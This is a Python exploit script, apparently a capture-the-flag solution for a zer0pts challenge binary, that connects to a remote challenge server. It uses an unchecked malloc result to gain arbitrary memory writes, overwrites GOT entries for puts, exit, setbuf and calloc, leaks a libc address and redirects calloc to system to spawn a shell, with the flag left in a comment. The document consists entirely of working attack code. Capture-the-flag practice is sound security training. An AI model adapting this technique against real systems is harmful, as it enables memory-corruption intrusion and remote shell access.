#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './chall'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'pwn.ctf.zer0pts.com', 'port':9004})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)
addr_plt_printf     = binf.plt['printf']

addr_got_puts       = binf.got['puts']
addr_got_exit       = binf.got['exit']
addr_got_setbuf     = binf.got['setbuf']
addr_got_calloc     = binf.got['calloc']

addr_start          = binf.sep_function['_start']
addr_main           = binf.sep_function['main']

addr_bss            = binf.sep_section['.bss']

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_stdin       = libc.symbols['_IO_2_1_stdin_']

#==========

def attack(conn, **kwargs):
    os = OneShot(conn)

    rop = ROP(binf)

    os.aaw(addr_got_puts, addr_main)
    os.aaw(addr_got_exit, rop.ret.address)

    os.ofw(0x20000//4, 0, 0xdeadbeef)
    os.ofw(0x20000//4, (0x20ff0 + offset_libc_stdin+4)//4, 0xffffffff)

    os.aaw(addr_got_setbuf, addr_plt_printf)
    os.aaw(addr_got_setbuf+4, 0)
    os.aaw(addr_got_puts, addr_start)

    conn.recv(8)
    addr_libc_stdin = u(conn.recv(6)) - 0x83
    libc.address = addr_libc_stdin - offset_libc_stdin
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system    = libc.sep_function['system']

    os.aaw(addr_got_puts, addr_main)

    os.aaw(addr_bss + 0x80, u16(b'sh'))
    os.aaw(addr_got_calloc, addr_libc_system & ((1<<32)-1))
    conn.sendlineafter('n = ', str(addr_bss+0x80))

class OneShot:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def aaw(self, addr, val):
        self.ofw(-1, addr//4, val)

    def ofw(self, n, idx, val):
        self.sendlineafter('n = ', str(n))
        self.sendlineafter('i = ', str(idx))
        self.sendlineafter('] = ', str(val))

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()
    # zer0pts{th1s_1s_why_y0u_sh0uld_ch3ck_r3turn_v4lu3_0f_malloc}

if __name__=='__main__':
    main()

#==========
